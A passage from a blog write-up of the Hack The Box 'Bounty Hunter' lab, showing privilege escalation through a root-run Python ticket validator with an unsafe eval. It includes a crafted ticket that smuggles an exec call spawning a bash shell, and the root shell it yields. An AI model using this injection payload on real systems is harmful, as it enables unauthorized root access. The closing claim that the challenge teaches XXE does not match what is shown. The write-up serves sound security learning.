User development may run the following commands on bountyhunter:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</code></pre></div><ul>
<li>Okay so we could run that <code>ticketValidator.py</code> file as root, and&mldr;</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>development@bountyhunter:~$ ls -l /opt/skytrain_inc/ticketValidator.py 
-r-xr--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1471</span> Jul <span style=color:#ae81ff>22</span> 11:08 /opt/skytrain_inc/ticketValidator.py
</code></pre></div><ul>
<li>It didn&rsquo;t looks like we can modify that file anyway. So let&rsquo;s cat it out and see what&rsquo;s what.</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py 
<span style=color:#75715e>#Skytrain Inc Ticket Validation System 0.1</span>
<span style=color:#75715e>#Do not distribute this file.</span>

def load_file<span style=color:#f92672>(</span>loc<span style=color:#f92672>)</span>:
    <span style=color:#66d9ef>if</span> loc.endswith<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;.md&#34;</span><span style=color:#f92672>)</span>:
        <span style=color:#66d9ef>return</span> open<span style=color:#f92672>(</span>loc, <span style=color:#e6db74>&#39;r&#39;</span><span style=color:#f92672>)</span>
    <span style=color:#66d9ef>else</span>:
        print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Wrong file type.&#34;</span><span style=color:#f92672>)</span>
        exit<span style=color:#f92672>()</span>

def evaluate<span style=color:#f92672>(</span>ticketFile<span style=color:#f92672>)</span>:
    <span style=color:#75715e>#Evaluates a ticket to check for ireggularities.</span>
    code_line <span style=color:#f92672>=</span> None
    <span style=color:#66d9ef>for</span> i,x in enumerate<span style=color:#f92672>(</span>ticketFile.readlines<span style=color:#f92672>())</span>:
        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> 0:
            <span style=color:#66d9ef>if</span> not x.startswith<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;# Skytrain Inc&#34;</span><span style=color:#f92672>)</span>:
                <span style=color:#66d9ef>return</span> False
            <span style=color:#66d9ef>continue</span>
        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> 1:
            <span style=color:#66d9ef>if</span> not x.startswith<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;## Ticket to &#34;</span><span style=color:#f92672>)</span>:
                <span style=color:#66d9ef>return</span> False
            print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&#34;</span><span style=color:#f92672>)</span>
            <span style=color:#66d9ef>continue</span>

        <span style=color:#66d9ef>if</span> x.startswith<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;__Ticket Code:__&#34;</span><span style=color:#f92672>)</span>:
            code_line <span style=color:#f92672>=</span> i+1
            <span style=color:#66d9ef>continue</span>

        <span style=color:#66d9ef>if</span> code_line and i <span style=color:#f92672>==</span> code_line:
            <span style=color:#66d9ef>if</span> not x.startswith<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;**&#34;</span><span style=color:#f92672>)</span>:
                <span style=color:#66d9ef>return</span> False
            ticketCode <span style=color:#f92672>=</span> x.replace<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;**&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>.split<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;+&#34;</span><span style=color:#f92672>)[</span>0<span style=color:#f92672>]</span>
            <span style=color:#66d9ef>if</span> int<span style=color:#f92672>(</span>ticketCode<span style=color:#f92672>)</span> % 7 <span style=color:#f92672>==</span> 4:
                validationNumber <span style=color:#f92672>=</span> eval<span style=color:#f92672>(</span>x.replace<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;**&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>))</span>
                <span style=color:#66d9ef>if</span> validationNumber &gt; 100:
                    <span style=color:#66d9ef>return</span> True
                <span style=color:#66d9ef>else</span>:
                    <span style=color:#66d9ef>return</span> False
    <span style=color:#66d9ef>return</span> False

def main<span style=color:#f92672>()</span>:
    fileName <span style=color:#f92672>=</span> input<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Please enter the path to the ticket file.\n&#34;</span><span style=color:#f92672>)</span>
    ticket <span style=color:#f92672>=</span> load_file<span style=color:#f92672>(</span>fileName<span style=color:#f92672>)</span>
    <span style=color:#75715e>#DEBUG print(ticket)</span>
    result <span style=color:#f92672>=</span> evaluate<span style=color:#f92672>(</span>ticket<span style=color:#f92672>)</span>
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result<span style=color:#f92672>)</span>:
        print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Valid ticket.&#34;</span><span style=color:#f92672>)</span>
    <span style=color:#66d9ef>else</span>:
        print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Invalid ticket.&#34;</span><span style=color:#f92672>)</span>
    ticket.close

main<span style=color:#f92672>()</span>
</code></pre></div><ul>
<li>Before breaking something, we&rsquo;ve to understand how it works first. So I wrote a perfectly valid &ldquo;ticket&rdquo; for the script:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-md data-lang=md># Skytrain Inc
<span style=color:#75715e>## Ticket to BountyHunter and friends
</span><span style=color:#75715e></span>__Ticket Code:__
**11+90
</code></pre></div>
<ul>
<li>And it worked as it should:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
/home/development/ticket.md
Destination: BountyHunter and friends
Valid ticket.
</code></pre></div><ul>
<li>Now the real question is - how to exploit this &ldquo;ticket&rdquo; function</li>
<li>The only line that caught my attention was this particular line:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>validationNumber <span style=color:#f92672>=</span> eval(x<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;**&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>))
</code></pre></div><p>Yes, that <code>eval</code>.</p>
<ul>
<li>As far as I knew, <code>eval</code> can only be used with Python&rsquo;s <code>expressions</code>, not <code>statements</code>. But a little bit of experience in Python can lead you to this:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>&gt;&gt;&gt;</span> eval(exec(<span style=color:#e6db74>&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>))
<span style=color:#960050;background-color:#1e0010>┌──</span>(aki<span style=color:#960050;background-color:#1e0010>㉿</span>kali)<span style=color:#f92672>-</span>[<span style=color:#f92672>~</span>]
<span style=color:#960050;background-color:#1e0010>└─$</span> 
</code></pre></div><ul>
<li>The only obstacle in our way was this 2 lines:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>ticketCode <span style=color:#f92672>=</span> x<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;**&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;+&#34;</span>)[<span style=color:#ae81ff>0</span>]
<span style=color:#66d9ef>if</span> int(ticketCode) <span style=color:#f92672>%</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span>:
</code></pre></div><ul>
<li>Basically, before we could get our sweet reverse shell, we need to bypass this check first</li>
<li>Of those 2 lines, the first one defined a <code>ticketCode</code> variable which is equal to the first part of our payload, before the first &ldquo;+&rdquo; sign, excluding all &ldquo;**&rdquo;. If we just insert our payload there, it wouldn&rsquo;t be able to be converted to <code>int</code> type and therefore, that <code>eval</code> statement would be ignored</li>
<li>However, <code>exec</code> in Python3 actually does return something. So I tried this:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>&gt;&gt;&gt;</span> eval(<span style=color:#ae81ff>11</span><span style=color:#f92672>+</span>exec(<span style=color:#e6db74>&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>))
<span style=color:#960050;background-color:#1e0010>┌──</span>(aki<span style=color:#960050;background-color:#1e0010>㉿</span>kali)<span style=color:#f92672>-</span>[<span style=color:#f92672>~</span>]
<span style=color:#960050;background-color:#1e0010>└─$</span> 
</code></pre></div><p>perfect. &lsquo;^&rsquo;</p>
<ul>
<li>So our full payload was:</li>
</ul>
<pre tabindex=0><code># Skytrain Inc
## Ticket to BountyHunter and friends
__Ticket Code:__
**11+exec(&quot;import pty; pty.spawn('/bin/bash')&quot;)
</code></pre><ul>
<li>Let&rsquo;s try out if it worked</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
/home/development/ticket.md
Destination: BountyHunter and friends
root@bountyhunter:/home/development# whoami
root
</code></pre></div><ul>
<li>And that&rsquo;s it, a great challenge to learn about XXE.</li>
</ul>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://git-akihakune.github.io/tags/ctf/>ctf</a></li>
<li><a href=https://git-akihakune.github.io/tags/tech/>tech</a></li>
<li><a href=https://git-akihakune.github.io/tags/english/>english</a></li>
</ul>
<nav class=paginav>
<a class=prev href=https://git-akihakune.github.io/blog/adventofcyber3/>
<span class=title>« Prev Page</span>
<br>
<span>Try Hack Me - Advent Of Cyber 3 writeup (Part 1)</span>
</a>
<a class=next href=https://git-akihakune.github.io/blog/hacktivitycon/>
<span class=title>Next Page »</span>
<br>
<span>Easy Hacktivitycon Challenges writeup</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Bounty Hunter writeup on twitter" href="https://twitter.com/intent/tweet/?text=Hack%20The%20Box%20-%20Bounty%20Hunter%20writeup&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fbountyhunter%2f&hashtags=ctf%2ctech%2cenglish"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Bounty Hunter writeup on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fbountyhunter%2f&title=Hack%20The%20Box%20-%20Bounty%20Hunter%20writeup&summary=Hack%20The%20Box%20-%20Bounty%20Hunter%20writeup&source=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fbountyhunter%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Bounty Hunter writeup on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fbountyhunter%2f&title=Hack%20The%20Box%20-%20Bounty%20Hunter%20writeup"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Bounty Hunter writeup on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fbountyhunter%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Bounty Hunter writeup on whatsapp" href="https://api.whatsapp.com/send?text=Hack%20The%20Box%20-%20Bounty%20Hunter%20writeup%20-%20https%3a%2f%2fgit-akihakune.github.io%2fblog%2fbountyhunter%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Bounty Hunter writeup on telegram" href="https://telegram.me/share/url?text=Hack%20The%20Box%20-%20Bounty%20Hunter%20writeup&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fbountyhunter%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer><script src=https://utteranc.es/client.js repo=git-akihakune/git-akihakune.github.io issue-term=pathname theme=photon-dark crossorigin=anonymous async></script>
</article>
</main>
<footer class=footer>
<span>&copy; 2022 <a href=https://git-akihakune.github.io>Hakune Blog</a></span>
- Aki Hakune
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{margin:0,scrollOffset:40,container:null,template:null,background:'rgba(0, 0, 0, 0.8)'})})</script>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>